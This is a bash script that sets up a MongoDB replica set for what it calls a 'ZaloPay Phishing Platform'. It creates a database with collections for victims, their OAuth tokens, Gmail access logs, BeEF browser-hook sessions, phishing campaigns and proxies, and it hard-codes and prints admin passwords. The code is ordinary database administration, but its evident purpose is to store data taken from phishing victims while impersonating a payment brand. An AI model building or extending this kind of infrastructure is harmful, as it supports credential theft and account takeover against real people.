#!/bin/bash

# MongoDB Replica Set Initialization Script
# Initializes MongoDB replica set for ZaloPay Phishing Platform

set -e

# Configuration
REPLICA_SET_NAME="rs0"
MONGODB_PRIMARY="mongodb-primary"
MONGODB_SECONDARY_1="mongodb-secondary-1"
MONGODB_SECONDARY_2="mongodb-secondary-2"
ADMIN_USERNAME="admin"
ADMIN_PASSWORD="Admin@ZaloPay2025!"
DATABASE_NAME="zalopay_phishing"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Wait for MongoDB container to be ready
wait_for_mongodb() {
    local container_name=$1
    local max_attempts=30
    local attempt=1
    
    log "Waiting for $container_name to be ready..."
    
    while [ $attempt -le $max_attempts ]; do
        if docker exec $container_name mongosh --eval "db.runCommand('ping')" > /dev/null 2>&1; then
            success "$container_name is ready"
            return 0
        fi
        
        log "Attempt $attempt/$max_attempts: $container_name not ready yet, waiting 10 seconds..."
        sleep 10
        attempt=$((attempt + 1))
    done
    
    error "$container_name failed to become ready after $max_attempts attempts"
    return 1
}

# Initialize replica set
init_replica_set() {
    log "Initializing MongoDB replica set..."
    
    # Wait for primary to be ready
    wait_for_mongodb $MONGODB_PRIMARY
    
    # Initialize replica set
    docker exec $MONGODB_PRIMARY mongosh --eval "
        rs.initiate({
            _id: '$REPLICA_SET_NAME',
            members: [
                { _id: 0, host: '$MONGODB_PRIMARY:27017', priority: 2 },
                { _id: 1, host: '$MONGODB_SECONDARY_1:27017', priority: 1 },
                { _id: 2, host: '$MONGODB_SECONDARY_2:27017', priority: 1 }
            ]
        })
    "
    
    success "Replica set initialized"
}

# Wait for replica set to be ready
wait_for_replica_set() {
    log "Waiting for replica set to be ready..."
    
    local max_attempts=30
    local attempt=1
    
    while [ $attempt -le $max_attempts ]; do
        local status=$(docker exec $MONGODB_PRIMARY mongosh --eval "rs.status().ok" --quiet)
        
        if [ "$status" = "1" ]; then
            local primary_status=$(docker exec $MONGODB_PRIMARY mongosh --eval "rs.status().members[0].stateStr" --quiet)
            
            if [ "$primary_status" = "PRIMARY" ]; then
                success "Replica set is ready and primary is elected"
                return 0
            fi
        fi
        
        log "Attempt $attempt/$max_attempts: Replica set not ready yet, waiting 10 seconds..."
        sleep 10
        attempt=$((attempt + 1))
    done
    
    error "Replica set failed to become ready after $max_attempts attempts"
    return 1
}

# Create admin user
create_admin_user() {
    log "Creating admin user..."
    
    docker exec $MONGODB_PRIMARY mongosh --eval "
        use admin;
        db.createUser({
            user: '$ADMIN_USERNAME',
            pwd: '$ADMIN_PASSWORD',
            roles: [
                { role: 'userAdminAnyDatabase', db: 'admin' },
                { role: 'readWriteAnyDatabase', db: 'admin' },
                { role: 'dbAdminAnyDatabase', db: 'admin' },
                { role: 'clusterAdmin', db: 'admin' }
            ]
        });
    "
    
    success "Admin user created"
}

# Create application database and user
create_app_database() {
    log "Creating application database and user..."
    
    docker exec $MONGODB_PRIMARY mongosh --eval "
        use $DATABASE_NAME;
        db.createUser({
            user: 'zalopay_user',
            pwd: 'ZaloPay2025!Secure',
            roles: [
                { role: 'readWrite', db: '$DATABASE_NAME' },
                { role: 'dbAdmin', db: '$DATABASE_NAME' }
            ]
        });
    "
    
    success "Application database and user created"
}

# Create collections and indexes
create_collections() {
    log "Creating collections and indexes..."
    
    # Create collections
    docker exec $MONGODB_PRIMARY mongosh --eval "
        use $DATABASE_NAME;
        
        // Create collections
        db.createCollection('victims');
        db.createCollection('oauth_tokens');
        db.createCollection('admin_users');
        db.createCollection('campaigns');
        db.createCollection('activity_logs');
        db.createCollection('gmail_access_logs');
        db.createCollection('beef_sessions');
        db.createCollection('proxies');
        
        // Create indexes for victims collection
        db.victims.createIndex({ 'session_id': 1 }, { unique: true });
        db.victims.createIndex({ 'ip_address': 1 });
        db.victims.createIndex({ 'user_agent': 1 });
        db.victims.createIndex({ 'created_at': -1 });
        db.victims.createIndex({ 'campaign_id': 1 });
        db.victims.createIndex({ 'status': 1 });
        
        // Create indexes for oauth_tokens collection
        db.oauth_tokens.createIndex({ 'victim_id': 1 }, { unique: true });
        db.oauth_tokens.createIndex({ 'access_token': 1 });
        db.oauth_tokens.createIndex({ 'refresh_token': 1 });
        db.oauth_tokens.createIndex({ 'expires_at': 1 });
        db.oauth_tokens.createIndex({ 'created_at': -1 });
        
        // Create indexes for admin_users collection
        db.admin_users.createIndex({ 'username': 1 }, { unique: true });
        db.admin_users.createIndex({ 'email': 1 }, { unique: true });
        db.admin_users.createIndex({ 'role': 1 });
        db.admin_users.createIndex({ 'is_active': 1 });
        
        // Create indexes for campaigns collection
        db.campaigns.createIndex({ 'name': 1 });
        db.campaigns.createIndex({ 'status': 1 });
        db.campaigns.createIndex({ 'created_at': -1 });
        db.campaigns.createIndex({ 'target_countries': 1 });
        
        // Create indexes for activity_logs collection
        db.activity_logs.createIndex({ 'victim_id': 1 });
        db.activity_logs.createIndex({ 'action': 1 });
        db.activity_logs.createIndex({ 'timestamp': -1 });
        db.activity_logs.createIndex({ 'ip_address': 1 });
        
        // Create indexes for gmail_access_logs collection
        db.gmail_access_logs.createIndex({ 'victim_id': 1 });
        db.gmail_access_logs.createIndex({ 'access_token': 1 });
        db.gmail_access_logs.createIndex({ 'timestamp': -1 });
        db.gmail_access_logs.createIndex({ 'action': 1 });
        
        // Create indexes for beef_sessions collection
        db.beef_sessions.createIndex({ 'session_id': 1 }, { unique: true });
        db.beef_sessions.createIndex({ 'victim_id': 1 });
        db.beef_sessions.createIndex({ 'browser_info': 1 });
        db.beef_sessions.createIndex({ 'created_at': -1 });
        db.beef_sessions.createIndex({ 'status': 1 });
        
        // Create indexes for proxies collection
        db.proxies.createIndex({ 'proxy_url': 1 }, { unique: true });
        db.proxies.createIndex({ 'type': 1 });
        db.proxies.createIndex({ 'country': 1 });
        db.proxies.createIndex({ 'status': 1 });
        db.proxies.createIndex({ 'last_check': -1 });
        db.proxies.createIndex({ 'success_rate': -1 });
        db.proxies.createIndex({ 'avg_response_time': 1 });
    "
    
    success "Collections and indexes created"
}

# Verify replica set status
verify_replica_set() {
    log "Verifying replica set status..."
    
    # Check replica set status
    docker exec $MONGODB_PRIMARY mongosh --eval "
        print('=== Replica Set Status ===');
        rs.status();
        print('\\n=== Replica Set Configuration ===');
        rs.conf();
    "
    
    # Check if all members are healthy
    local healthy_members=$(docker exec $MONGODB_PRIMARY mongosh --eval "rs.status().members.length" --quiet)
    
    if [ "$healthy_members" = "3" ]; then
        success "All 3 replica set members are healthy"
    else
        warning "Only $healthy_members out of 3 members are healthy"
    fi
}

# Test database connectivity
test_connectivity() {
    log "Testing database connectivity..."
    
    # Test admin user authentication
    docker exec $MONGODB_PRIMARY mongosh -u $ADMIN_USERNAME -p $ADMIN_PASSWORD --eval "
        use admin;
        db.runCommand({ connectionStatus: 1 });
    " > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        success "Admin user authentication successful"
    else
        error "Admin user authentication failed"
        return 1
    fi
    
    # Test application database access
    docker exec $MONGODB_PRIMARY mongosh -u zalopay_user -p ZaloPay2025!Secure --eval "
        use $DATABASE_NAME;
        db.runCommand({ connectionStatus: 1 });
    " > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        success "Application user authentication successful"
    else
        error "Application user authentication failed"
        return 1
    fi
}

# Display summary
display_summary() {
    log "MongoDB Replica Set Initialization Complete!"
    echo
    echo "=========================================="
    echo "MongoDB Configuration Summary"
    echo "=========================================="
    echo
    echo "🔧 Replica Set Configuration:"
    echo "   Name: $REPLICA_SET_NAME"
    echo "   Primary: $MONGODB_PRIMARY:27017"
    echo "   Secondary 1: $MONGODB_SECONDARY_1:27017"
    echo "   Secondary 2: $MONGODB_SECONDARY_2:27017"
    echo
    echo "👤 Admin User:"
    echo "   Username: $ADMIN_USERNAME"
    echo "   Password: $ADMIN_PASSWORD"
    echo "   Roles: userAdminAnyDatabase, readWriteAnyDatabase, dbAdminAnyDatabase, clusterAdmin"
    echo
    echo "📊 Application Database:"
    echo "   Database: $DATABASE_NAME"
    echo "   Username: zalopay_user"
    echo "   Password: ZaloPay2025!Secure"
    echo "   Roles: readWrite, dbAdmin"
    echo
    echo "📋 Collections Created:"
    echo "   ✓ victims (with indexes)"
    echo "   ✓ oauth_tokens (with indexes)"
    echo "   ✓ admin_users (with indexes)"
    echo "   ✓ campaigns (with indexes)"
    echo "   ✓ activity_logs (with indexes)"
    echo "   ✓ gmail_access_logs (with indexes)"
    echo "   ✓ beef_sessions (with indexes)"
    echo "   ✓ proxies (with indexes)"
    echo
    echo "🔗 Connection String:"
    echo "   mongodb://zalopay_user:ZaloPay2025!Secure@$MONGODB_PRIMARY:27017,$MONGODB_SECONDARY_1:27017,$MONGODB_SECONDARY_2:27017/$DATABASE_NAME?replicaSet=$REPLICA_SET_NAME"
    echo
}

# Main execution
main() {
    log "Starting MongoDB replica set initialization..."
    
    # Check if containers are running
    if ! docker ps | grep -q $MONGODB_PRIMARY; then
        error "MongoDB primary container is not running"
        exit 1
    fi
    
    if ! docker ps | grep -q $MONGODB_SECONDARY_1; then
        error "MongoDB secondary-1 container is not running"
        exit 1
    fi
    
    if ! docker ps | grep -q $MONGODB_SECONDARY_2; then
        error "MongoDB secondary-2 container is not running"
        exit 1
    fi
    
    # Initialize replica set
    init_replica_set
    
    # Wait for replica set to be ready
    wait_for_replica_set
    
    # Create admin user
    create_admin_user
    
    # Create application database
    create_app_database
    
    # Create collections and indexes
    create_collections
    
    # Verify replica set
    verify_replica_set
    
    # Test connectivity
    test_connectivity
    
    # Display summary
    display_summary
    
    success "MongoDB replica set initialization completed successfully!"
}

# Run main function
main "$@"
